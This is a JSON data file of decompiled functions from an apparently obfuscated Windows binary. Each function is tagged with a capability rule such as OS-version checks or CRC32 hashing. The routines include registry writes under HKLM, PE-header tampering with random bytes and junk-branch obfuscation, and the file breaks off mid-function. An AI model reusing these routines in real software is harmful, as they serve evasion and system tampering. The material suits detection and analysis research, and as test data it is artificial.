{
    "null": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401de0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401de0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(arg_8h);\n    var_14h = 0x422510;\n    var_10h = 0x422508;\n    var_ch = 0x422518;\n    var_8h = 0x422520;\n    var_4h = 0x422528;\n    uVar3 = 0;\n    puVar2 = &var_14h;\n    do {\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, *puVar2);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar3 = uVar3 + 1;\n        puVar2 = puVar2 + 1;\n    } while (uVar3 < 5);\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, 0x422500);\n    return iVar1 == 0;\n}\n",
        "token_count": 287
    },
    "00403b90": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403b90(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x42215c, arg_8h);\n    (*pcVar2)(&var_264h, 0x422174, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x42219c;\n    var_30h = 0x4221a8;\n    var_2ch = 0x4221b4;\n    var_28h = 0x4221c4;\n    var_24h = 0x4221cc;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1094
    },
    "00404810": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404914) overlaps instruction at (ram,0x00404910)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x004049b9)\n// WARNING: Removing unreachable block (ram,0x004049c3)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404810(int16_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    uchar *puVar8;\n    uint *unaff_ESI;\n    uint *puVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint *unaff_EDI;\n    uint *puVar12;\n    bool in_CF;\n    bool in_ZF;\n    bool bVar13;\n    bool bVar14;\n    ulong uVar15;\n    uint *puVar7;\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        unaff_ESI = unaff_EDI;\n    }\n    if (*arg_8h != 0x5a4d) {\n        return 0;\n    }\n    piVar1 = arg_8h + 0x45503f;\n    *piVar1 = *piVar1;\n    if (*piVar1 != 0) {\n        return 0;\n    }\n    if (*(arg_8h + *(arg_8h + 0x1e) + 0x58) == 0) {\n        puVar12 = 0x40;\n        if (*(arg_8h + 0x1e) < 0x81) {\n            return 0;\n        }\n        if (*(arg_8h + 0x1e) < 0xc0) {\n            puVar12 = *(arg_8h + 0x1e) - 0x80;\n        }\n        puVar2 = puVar12 + 1;\n        *puVar12 = *unaff_ESI;\n        *0xfffffffc = 0x40491a;\n        uVar15 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n        puVar12 = uVar15;\n        puVar6 = 0x4;\n        if (puVar12 == NULL) {\n            return 0;\n        }\n        puVar9 = NULL;\n        bVar14 = false;\n        bVar13 = puVar2 == NULL;\n        puVar8 = 0x4;\n        puVar10 = puVar9;\n        puVar11 = puVar2;\n        _pe_dos_header = puVar12;\n        if (!bVar13) {\n            do {\n                *(puVar6 + -4) = uVar15;\n                *(puVar6 + -6) = uVar15 >> 0x20;\n                pcVar3 = _sym.imp.MSVCRT.dll_rand;\n                puVar7 = puVar6 + -4;\n                puVar6 = puVar6 + -4;\n                *puVar7 = 0x404969;\n                iVar4 = (*pcVar3)();\n                uVar15 = CONCAT44(iVar4 % 0xff, iVar4 / 0xff);\n                puVar9 = puVar10 + 1;\n                bVar14 = SBORROW4(puVar9, puVar2);\n                puVar11 = puVar9 - puVar2;\n                bVar13 = puVar9 == puVar2;\n                *(puVar10 + puVar12) = iVar4 % 0xff;\n                puVar8 = puVar6;\n                puVar10 = puVar9;\n            } while (puVar9 < puVar2);\n        }\n        if (!bVar13 && bVar14 == puVar11 < 0) {\n            *(puVar8 + -2) = puVar9;\n        }\n        iVar4 = *0x57e181d8;\n        puVar11 = puVar12;\n        puVar10 = *0x57e181d8 + 0x80;\n        for (uVar5 = puVar2 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar10 = *puVar11;\n            puVar11 = puVar11 + 1;\n            puVar10 = puVar10 + 1;\n        }\n        for (uVar5 = puVar2 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar10 = *puVar11;\n            puVar11 = puVar11 + 1;\n            puVar10 = puVar10 + 1;\n        }\n        *(puVar8 + -2) = iVar4;\n        *(puVar8 + -4) = puVar12;\n        *(puVar8 + -8) = 0x4049cc;\n        sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 1135
    },
    "00404d20": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint64_t fcn.00404d20(void)\n\n{\n    uint32_t extraout_EDX;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    return extraout_EDX << 0x20;\n}\n",
        "token_count": 152
    },
    "00401050": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011d4) overlaps instruction at (ram,0x004011d1)\n// \n// WARNING: Removing unreachable block (ram,0x00401193)\n\nint32_t fcn.00401050(uint param_1, uint param_2, uint param_3, char *param_4, uint param_5, uint param_6, char *param_7)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    char *arg_18h;\n    uint *puVar4;\n    uint *puVar5;\n    bool bVar6;\n    ulong uVar7;\n    \n    puVar4 = &stack0xfffffffc;\n    fcn.00404da0(param_5, param_6, param_1, 0x20, param_7 + 0x20);\n    fcn.00404da0(param_5, param_6, param_2, 0x20, param_7 + 0x60);\n    bVar6 = false;\n    uVar7 = fcn.00404da0(param_5, param_6, param_3, 0x20, param_7 + 0xa0);\n    arg_18h = uVar7 >> 0x20;\n    if ((bVar6) || (!bVar6)) {\n        arg_18h = param_7 + 0xe0;\n    }\n    else {\n        uVar2 = uVar7 + 0x7c8ecb0d + (bVar6 == false);\n        *(param_7 + 0x43d1773a) = *(param_7 + 0x43d1773a) ^ 0x8b27e95e;\n        puVar4 = &stack0xfffffffd;\n        *param_7 = *param_7 + param_7;\n        param_4 = param_7;\n        param_7 = uVar2 & 0xffffff00 | uVar2 + 0x8d;\n    }\n    fcn.00404da0(param_5, param_6, param_4, 0x20, arg_18h);\n    bVar6 = (POPCOUNT(&stack0xfffffee4 & 0xff) & 1U) != 0;\n    if ((bVar6) && (!bVar6)) {\n        puVar5 = &stack0xfffffee0;\n        cVar1 = '\\x1e';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        iVar3 = in(0x78);\n        return iVar3;\n    }\n    iVar3 = func_0x00401000();\n    if (iVar3 == -1) {\n        iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n        param_7[0x120] = iVar3 % 5;\n    }\n    else {\n        param_7[0x120] = iVar3;\n    }\n    *(puVar4 + -0x43) = 0;\n    puVar5 = puVar4 + -0x10b;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    puVar4[-1] = 0x104;\n    *(puVar5 + 2) = 0;\n    iVar3 = fcn.00404510(0x80000001, 0x422328, 0x422354, puVar4 + -2, puVar4 + -0x43, puVar4 + -1);\n    bVar6 = iVar3 != 0;\n    if (bVar6) {\n        if ((bVar6) && (!bVar6)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        iVar3 = (*_sym.imp.MSVCRT.dll__stricmp)(puVar4 + -0x43);\n        if (iVar3 == 0) {\n            iVar3 = puVar4[8];\n            *(iVar3 + 0x120) = *(iVar3 + 0x120) | 0x80;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1001
    },
    "004028c0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402c40) overlaps instruction at (ram,0x00402c3f)\n// \n\nuint fcn.004028c0(void)\n\n{\n    int32_t *piVar1;\n    uint8_t extraout_AH;\n    uint8_t extraout_AH_00;\n    uint8_t extraout_AH_01;\n    uint uVar2;\n    int32_t iVar3;\n    uint8_t extraout_CL;\n    uint16_t extraout_CX;\n    uint16_t extraout_CX_00;\n    uint8_t extraout_CH;\n    char extraout_CH_00;\n    uint16_t extraout_CX_01;\n    uint extraout_ECX;\n    uint32_t extraout_ECX_00;\n    char extraout_DL;\n    uint8_t uVar4;\n    uint32_t *puVar5;\n    uint8_t *extraout_EDX;\n    uint16_t uVar6;\n    uint8_t *unaff_EBX;\n    uint *unaff_EBP;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint16_t in_SS;\n    bool in_PF;\n    bool bVar7;\n    uchar in_ZF;\n    char cVar8;\n    uint8_t in_IF;\n    bool bVar9;\n    char cVar10;\n    uchar uVar11;\n    bool bVar12;\n    ulong uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint *puVar16;\n    uint32_t uVar17;\n    uint uStack20;\n    ushort uStack16;\n    ushort uStack14;\n    \n    bVar9 = false;\n    if ((!in_PF) && (in_PF)) {\n        puVar16 = &uStack16;\n        cVar8 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar16 = puVar16 + -1;\n            *puVar16 = *unaff_EBP;\n            cVar8 = cVar8 + -1;\n        } while ('\\0' < cVar8);\n        uVar2 = in(0x78);\n        return uVar2;\n    }\n    uStack16 = 10;\n    uStack14 = 0;\n    fcn.00401680();\n    if ((!in_ZF) && (in_ZF)) {\n        bVar9 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n    }\n    fcn.00401680(0x4220d4, 9);\n    uVar2 = 0x422114;\n    fcn.00401680(0x4220d4, 9, 0x422114, 4);\n    uStack16 = 0xc;\n    uStack14 = 0;\n    fcn.00401680();\n    uStack16 = 7;\n    uStack14 = 0;\n    fcn.00401680();\n    uStack16 = 0xb;\n    uStack14 = 0;\n    fcn.00401680();\n    cVar10 = '\\0';\n    cVar8 = (unaff_EBX ^ extraout_CX) < 0;\n    uStack16 = 0xc;\n    uStack14 = 0;\n    uVar13 = fcn.00401680();\n    puVar5 = uVar13 >> 0x20;\n    if ((cVar10 == cVar8) && (cVar10 != cVar8)) {\n        *(unaff_ESI + 0x11) = *(unaff_ESI + 0x11) | (extraout_CX_00 << 0x10) >> 0x18;\n        *puVar5 = *puVar5 & unaff_ESI;\n        unaff_ESI = uVar13;\n    }\n    fcn.00401680(0x4220d4, 9);\n    uStack16 = 0xd;\n    uStack14 = 0;\n    fcn.00401680();\n    uVar11 = 0;\n    uStack16 = 0x18;\n    uStack14 = 0;\n    fcn.00401680();\n    uVar17 = 0x422174;\n    iVar3 = fcn.00401680(0x4220d4, 9);\n    if ((uVar11) || (!uVar11)) {\n        uVar15 = 10;\n        uVar2 = 0x42219c;\n    }\n    else {\n        *unaff_EDI = *unaff_ESI;\n        *0x9c680a6a = *0x9c680a6a & iVar3 + 1U;\n        unaff_ESI = unaff_ESI + bVar9 * -2 + 1;\n        uVar15 = extraout_ECX;\n    }\n    uVar14 = 9;\n    fcn.00401680(0x4220d4, 9, uVar2, uVar15);\n    uStack16 = 0xc;\n    uStack14 = 0;\n    fcn.00401680();\n    uStack16 = 0xd;\n    uStack14 = 0;\n    fcn.00401680();\n    uVar17 = uVar17 & 0xffff0000 | in_SS;\n    uVar6 = in_SS;\n    fcn.00401680(0x4220d4, 9, 0x4221c4);\n    fcn.00401680();\n    fcn.00401680();\n    puVar16 = unaff_ESI;\n    fcn.00401680();\n    while( true ) {\n        fcn.00401680();\n        bVar9 = false;\n        bVar7 = (POPCOUNT((extraout_CH ^ extraout_AH) + 1 & 0x27) & 1U) == 0;\n        fcn.00401680();\n        if ((bVar7) || (!bVar7)) break;\n        piVar1 = segment(uVar6, *0x10 + -0x20);\n        if (bVar9) {\n            unaff_EBP = unaff_EBP | *(*piVar1 + 0x2c);\n            goto code_r0x00402c46;\n        }\n        if (!bVar7) break;\n        *(unaff_ESI + 0x41) = *(unaff_ESI + 0x41) + (*piVar1 >> 8);\n    }\n    puVar16 = 0x9;\ncode_r0x00402c46:\n    while( true ) {\n        fcn.00401680(0x4220d4, puVar16);\n        uVar4 = extraout_DL + 0x15;\n        bVar9 = uVar4 < extraout_AH_00;\n        bVar12 = SBORROW1(uVar4, extraout_AH_00);\n        bVar7 = uVar4 - extraout_AH_00 == '\\0';\n        uVar11 = (POPCOUNT(uVar4 - extraout_AH_00) & 1U) == 0;\n        puVar16 = 0x4220d4;\n        fcn.00401680();\n        if ((bVar9 || bVar7) || (!bVar9 && !bVar7)) break;\n        if (!bVar12) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *extraout_EDX = *extraout_EDX & extraout_AH_01;\n        extraout_EDX[10] = extraout_EDX[10] + extraout_CH_00;\n    }\n    uVar2 = 0x422238;\n    fcn.00401680(0x4220d4, 9, 0x422238);\n    if ((uVar11) || (!uVar11)) {\n        uVar17 = 10;\n        uVar14 = 0x422244;\n    }\n    else {\n        unaff_ESI = 0x34a96cf4;\n        unaff_EBP = *0x6a17b43a;\n    }\n    fcn.00401680(0x4220d4, 9, uVar14, uVar17);\n    fcn.00401680();\n    cVar10 = '\\0';\n    uVar6 = unaff_EBX ^ extraout_CX_01;\n    cVar8 = uVar6 < 0;\n    bVar9 = uVar6 == 0;\n    iVar3 = fcn.00401680();\n    if ((bVar9 || cVar10 != cVar8) || (!bVar9 && cVar10 == cVar8)) {\n        uVar2 = 0x42226c;\n    }\n    else {\n        unaff_EBX = unaff_EBX + 1;\n        *(iVar3 + 0x6a39da56) = *(iVar3 + 0x6a39da56) ^ extraout_CL;\n        *(iVar3 + 0x6c) = *(iVar3 + 0x6c) + unaff_EBP;\n    }\n    fcn.00401680(0x4220d4, 9, uVar2);\n    fcn.00401680();\n    bVar9 = (POPCOUNT(in_SS + 0x62U | 0x4c | extraout_ECX_00 & 0xff) & 1U) == 0;\n    fcn.00401680();\n    if ((!bVar9) && (bVar9)) {\n        puVar16 = &stack0xffffffdc;\n        cVar8 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar16 = puVar16 + -1;\n            *puVar16 = *unaff_EBP;\n            cVar8 = cVar8 + -1;\n        } while ('\\0' < cVar8);\n        uVar2 = in(0x78);\n        return uVar2;\n    }\n    fcn.00401680(0x4220d4, 9, 0x4222a8);\n    fcn.00401680();\n    bVar9 = (unaff_ESI & 0xffff0000 | unaff_ESI + 1) < 0x222c;\n    uVar2 = fcn.00401680();\n    if ((!bVar9) && (bVar9)) {\n        out(0xbd, uVar2);\n        return uVar2;\n    }\n    fcn.00401680(0x4220d4, 9, 0x4222ec);\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    fcn.00401680(0x4220d4, 9, 0x4222f4);\n    fcn.00401680();\n    uVar2 = fcn.00401680();\n    return uVar2;\n}\n",
        "token_count": 2422
    },
    "00402ee0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402f64) overlaps instruction at (ram,0x00402f63)\n// \n// WARNING: Removing unreachable block (ram,0x00403130)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00402ee0(ushort param_1)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint32_t extraout_ECX;\n    uint32_t uVar4;\n    int32_t extraout_ECX_00;\n    char extraout_CH;\n    char extraout_CH_00;\n    int32_t extraout_ECX_01;\n    ushort extraout_DX;\n    uint8_t extraout_DH;\n    uint32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    char *unaff_EBX;\n    uint *puVar5;\n    uint *unaff_EBP;\n    uint *puVar6;\n    char *unaff_ESI;\n    char *pcVar7;\n    uint8_t **ppuVar8;\n    uint8_t **ppuVar9;\n    char **ppcVar10;\n    ushort in_SS;\n    bool in_ZF;\n    uchar uVar11;\n    uchar uVar12;\n    char cVar13;\n    uint8_t in_IF;\n    bool bVar14;\n    bool bVar15;\n    char cVar16;\n    float10 fVar17;\n    uint uStack24239;\n    uint uStack24235;\n    uint uStack24231;\n    uint uStack24227;\n    uint uStack24223;\n    uint uStack24219;\n    uint uStack24215;\n    uchar uStack24211;\n    ushort uStack24210;\n    uint uStack24208;\n    char **ppcStack24204;\n    uchar uStack24200;\n    uchar uStack24199;\n    uchar uStack24198;\n    uchar uStack24197;\n    uchar uStack24196;\n    uchar uStack24195;\n    uchar uStack24194;\n    uchar uStack24193;\n    uchar uStack24192;\n    uchar uStack24191;\n    ushort uStack24190;\n    int32_t iStack24188;\n    uchar uStack24184;\n    ushort uStack24183;\n    uchar uStack24181;\n    uchar uStack24180;\n    uchar uStack24179;\n    ushort uStack24178;\n    uint32_t uStack24176;\n    uint8_t uStack24172;\n    uchar *puStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    char *pcStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    ushort uStack28;\n    ushort uStack26;\n    ushort uStack24;\n    ushort uStack22;\n    ushort uStack20;\n    ushort uStack18;\n    uint uStack16;\n    \n    bVar14 = false;\n    if ((in_ZF) || (uStack16 = CONCAT22(param_1, uStack16),  !in_ZF)) {\n        uStack16 = 0x11;\n    }\n    ppuVar8 = CONCAT22(uStack18, in_SS);\n    uStack20 = 0x47;\n    uStack18 = 0;\n    bVar15 = false;\n    uStack24 = 0x20e0;\n    uStack22 = 0x42;\n    uStack28 = 9;\n    uStack26 = 0;\n    uStack32 = 0x4220d4;\n    uStack36 = 0x402f07;\n    fcn.00401680();\n    if ((!bVar15) && (bVar15)) {\n        LOCK();\n        unaff_ESI = 0x138b2633;\n    }\n    while( true ) {\n        uStack36 = 0xf;\n        uStack40 = 0x4222fc;\n        pcStack44 = 0x9;\n        uStack48 = 0x4220d4;\n        uStack52 = 0x402f3d;\n        fcn.00401680();\n        uStack20 = 0x1a;\n        uStack18 = 0;\n        uStack24 = 0x230c;\n        uStack22 = 0x42;\n        uStack28 = 9;\n        uStack26 = 0;\n        uStack32 = 0x4220d4;\n        uStack36 = 0x402f5d;\n        fcn.00401680();\n        uStack20 = 10;\n        uStack18 = 0;\n        uStack24 = 0x2360;\n        uStack22 = 0x42;\n        uStack28 = 9;\n        uStack26 = 0;\n        uStack32 = 0x4220d4;\n        uStack36 = 0x402f7d;\n        fcn.00401680();\n        uStack20 = 0xb;\n        uStack18 = 0;\n        uStack24 = 0x236c;\n        uStack22 = 0x42;\n        uStack28 = 9;\n        uStack26 = 0;\n        uStack32 = 0x4220d4;\n        uStack36 = 0x402fad;\n        fcn.00401680();\n        uVar4 = extraout_ECX & 0xffff0000 | CONCAT11((extraout_ECX >> 8) - unaff_EBX, extraout_ECX);\n        cVar16 = SBORROW4(uVar4, extraout_EDX);\n        cVar13 = uVar4 - extraout_EDX < 0;\n        uVar11 = uVar4 == extraout_EDX;\n        uStack20 = 8;\n        uStack18 = 0;\n        uStack24 = 0x2378;\n        uStack22 = 0x42;\n        uStack28 = 9;\n        uStack26 = 0;\n        uStack32 = 0x4220d4;\n        uStack36 = 0x402fd6;\n        pcStack44 = unaff_ESI;\n        fcn.00401680();\n        if ((uVar11 || cVar16 != cVar13) || (!uVar11 && cVar16 == cVar13)) break;\n        if (extraout_ECX_00 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        unaff_ESI = unaff_ESI + 1;\n    }\n    uStack36 = 9;\n    uStack40 = 0x422380;\n    pcStack44 = 0x9;\n    uStack48 = 0x4220d4;\n    uStack52 = 0x402ffb;\n    fcn.00401680();\n    uStack52 = 9;\n    uStack56 = 0x42238c;\n    uStack60 = 9;\n    uStack64 = 0x4220d4;\n    uStack68 = 0x40301a;\n    fcn.00401680();\n    if ((!uVar11) && (uVar11)) {\n        bVar14 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n    }\n    uStack68 = 9;\n    uStack72 = 0x422398;\n    uStack76 = 9;\n    uStack80 = 0x4220d4;\n    uStack84 = 0x403039;\n    fcn.00401680();\n    bVar15 = &stack0xfffffff0 < 0;\n    uVar11 = *0x10 == 0x10;\n    puVar6 = unaff_EBP;\n    if ((!uVar11) && (uVar11)) {\n        puStack88 = 0xfffffffc;\n        puVar5 = 0xfffffffc;\n        puVar6 = 0xfffffffc;\n        uStack20 = SUB42(unaff_EBP, 0);\n        uStack18 = unaff_EBP >> 0x10;\n        cVar13 = '\\x10';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *unaff_EBP;\n            cVar13 = cVar13 + -1;\n        } while ('\\0' < cVar13);\n    }\n    uStack24183 = 0xc;\n    uStack24181 = 0;\n    uStack24180 = 0;\n    uStack24184 = 0;\n    uStack24191 = 9;\n    uStack24190 = 0;\n    iStack24188 = 0x4223a400;\n    uStack24195 = 0xd4;\n    uStack24194 = 0x20;\n    uStack24193 = 0x42;\n    uStack24192 = 0;\n    uStack24199 = 0x5e;\n    uStack24198 = 0x30;\n    uStack24197 = 0x40;\n    uStack24196 = 0;\n    fVar17 = fcn.00401680();\n    if ((!bVar15) && (bVar15)) {\n        ppuVar9 = ppuVar8 + bVar14 * -2 + 1;\n        pcVar7 = unaff_ESI + bVar14 * -8 + 4;\n        *(ppuVar9 + 6) = fVar17;\n        ppuVar8 = ppuVar9 + bVar14 * -2 + 1;\n        unaff_ESI = pcVar7 + bVar14 * -2 + 1;\n        uVar11 = *pcVar7 == *ppuVar9;\n    }\n    uStack24195 = 3;\n    uStack24194 = 0;\n    uStack24193 = 0;\n    uStack24192 = 0;\n    uStack24199 = 0xb0;\n    uStack24198 = 0x23;\n    uStack24197 = 0x42;\n    uStack24196 = 0;\n    uStack24200 = 0;\n    ppcStack24204 = 0x900;\n    uStack24211 = 0x82;\n    uStack24210 = 0x4030;\n    uStack24208._1_3_ = 0x4220d4;\n    uStack24208._0_1_ = 0;\n    fcn.00401680();\n    pcVar7 = unaff_ESI;\n    if ((!uVar11) && (uVar11)) {\n        pcVar7 = unaff_ESI + bVar14 * -2 + 1;\n        out(*unaff_ESI, extraout_DX);\n    }\n    uStack24211 = 10;\n    uStack24210 = 0;\n    uStack24208 = uStack24208._1_3_ << 8;\n    uStack24215 = 0x4223b4;\n    uStack24219 = 9;\n    uStack24223 = 0x4220d4;\n    uStack24227 = 0x4030ad;\n    fcn.00401680();\n    uStack24176 = uStack24176 & 0xffffff00;\n    uVar1 = unaff_EBX >> 8;\n    uStack24179 = 0x40;\n    uStack24178 = 0;\n    uStack24183 = 0x23c0;\n    uStack24181 = 0x42;\n    uStack24180 = 0;\n    uStack24184 = 0;\n    uStack24191 = 0xd4;\n    uStack24190 = 0x4220;\n    iStack24188 = 0x900;\n    uStack24195 = 0xe2;\n    uStack24194 = 0x30;\n    uStack24193 = 0x40;\n    uStack24192 = 0;\n    uVar2 = fcn.00401680();\n    uStack24176 = uStack24176 & 0xffffff00;\n    uVar11 = 0;\n    cVar16 = '\\0';\n    cVar13 = (uVar2 ^ 0xca) < '\\0';\n    uVar12 = (uVar2 ^ 0xca) == 0;\n    uStack24179 = 0xc;\n    uStack24178 = 0;\n    uStack24183 = 0x2400;\n    uStack24181 = 0x42;\n    uStack24180 = 0;\n    uStack24184 = 0;\n    uStack24191 = 0xd4;\n    uStack24190 = 0x4220;\n    iStack24188 = 0x900;\n    uStack24195 = 0xe;\n    uStack24194 = 0x31;\n    uStack24193 = 0x40;\n    uStack24192 = 0;\n    puVar3 = fcn.00401680();\n    ppuVar9 = ppuVar8;\n    if ((cVar16 == cVar13) && (cVar16 != cVar13)) {\n        out(0xc4, puVar3);\n        bVar14 = false;\n        ppuVar9 = ppuVar8 + 1;\n        *ppuVar8 = puVar3;\n        uVar11 = uVar1 < *puVar3;\n        uVar12 = uVar1 == *puVar3;\n    }\n    uStack24195 = 0xb;\n    uStack24194 = 0;\n    uStack24193 = 0;\n    uStack24192 = 0;\n    uStack24199 = 0xc;\n    uStack24198 = 0x24;\n    uStack24197 = 0x42;\n    uStack24196 = 0;\n    uStack24200 = 0;\n    ppcStack24204 = 0x900;\n    uStack24211 = 0x42;\n    uStack24210 = 0x4031;\n    uStack24208._1_3_ = 0x4220d4;\n    uStack24208._0_1_ = 0;\n    fcn.00401680();\n    if ((!uVar11) && (uVar11)) {\n        uVar4 = uVar11;\n        uVar11 = CARRY4(unaff_EBX, *(unaff_EBX + extraout_EDX_00 * 4 + 0x69)) ||\n                 CARRY4(unaff_EBX + *(unaff_EBX + extraout_EDX_00 * 4 + 0x69), uVar4);\n        unaff_EBX = unaff_EBX + *(unaff_EBX + extraout_EDX_00 * 4 + 0x69) + uVar4;\n        uVar12 = unaff_EBX == NULL;\n    }\n    uStack24211 = 4;\n    uStack24210 = 0;\n    uStack24208 = uStack24208._1_3_ << 8;\n    uStack24215 = 0x422418;\n    uStack24219 = 9;\n    uStack24223 = 0x4220d4;\n    uStack24227 = 0x40316c;\n    fcn.00401680();\n    if ((uVar11 || uVar12) || (!uVar11 && !uVar12)) {\n        uStack24227 = 4;\n        uStack24231 = 0x42241c;\n        uStack24235 = 9;\n    }\n    cVar13 = *unaff_EBX;\n    *(ppuVar9 + 0x6a) = *(ppuVar9 + 0x6a) - &stack0xffffa155;\n    *(extraout_EDX_01 + 